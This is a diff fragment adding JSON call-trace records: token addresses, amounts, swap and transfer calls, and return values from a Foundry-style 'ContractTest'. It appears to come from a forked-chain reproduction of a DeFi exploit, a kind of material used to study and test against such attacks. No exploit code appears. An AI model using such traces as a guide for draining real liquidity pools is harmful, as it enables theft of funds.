+        "args": "USDT: [0x55d398326f99059fF775485246999027B3197955], BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 2786077967996179651553685 [2.786e24], 1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1680386219 [1.68e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000024ecd77ecb6cd02857f3800000000000000000000000000000000000000000000000f20456ea59e2c412c"
+    },
+    {
+        "id": "45240",
+        "args": "USDT: [0x55d398326f99059fF775485246999027B3197955], BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 2786077967996179651553685 [2.786e24], 1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1680386219 [1.68e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000024ecd77ecb6cd02857f3800000000000000000000000000000000000000000000000f20456ea59e2c412c"
+    },
+    {
+        "id": "250",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000012"
+    },
+    {
+        "id": "250",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000012"
+    },
+    {
+        "id": "358",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000004cc3e512244ef06659e89"
+    },
+    {
+        "id": "391",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000085f4f1683d42e354bb7a4"
+    },
+    {
+        "id": "358",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000b80b3f0bf8f4246971d03"
+    },
+    {
+        "id": "391",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000007a622456c12238ae3aad0"
+    },
+    {
+        "id": "976",
+        "args": "2786077967996179651553685 [2.786e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1028",
+        "args": "2790265475458523630518372 [2.79e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "358",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000931d7588d69cfa5e55c9f"
+    },
+    {
+        "id": "391",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000007a622456c12238ae3aad0"
+    },
+    {
+        "id": "6034",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x4F95fE57BEA74b7F642cF9c097311959B9b988F7, 2786077967996179651553685 [2.786e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "5397",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2789986448910977778155320 [2.789e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3271",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2789986448910977778155320 [2.789e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3271",
+        "args": "Pair: [0x7EFaEf62fDdCCa950418312c6C91Aef321375A00], 7522500000000000000000000 [7.522e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2531",
+        "args": "Pair: [0x7EFaEf62fDdCCa950418312c6C91Aef321375A00]",
+        "original_code": null,
+        "description": null,
+        "return_value": "35749595255826584159954288 [3.574e25]"
+    },
+    {
+        "id": "531",
+        "args": "Pair: [0x7EFaEf62fDdCCa950418312c6C91Aef321375A00]",
+        "original_code": null,
+        "description": null,
+        "return_value": "35798414711595759756938815 [3.579e25]"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "549889574365192879687841 [5.498e23]"
+    },
+    {
+        "id": "2425",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    }
+]
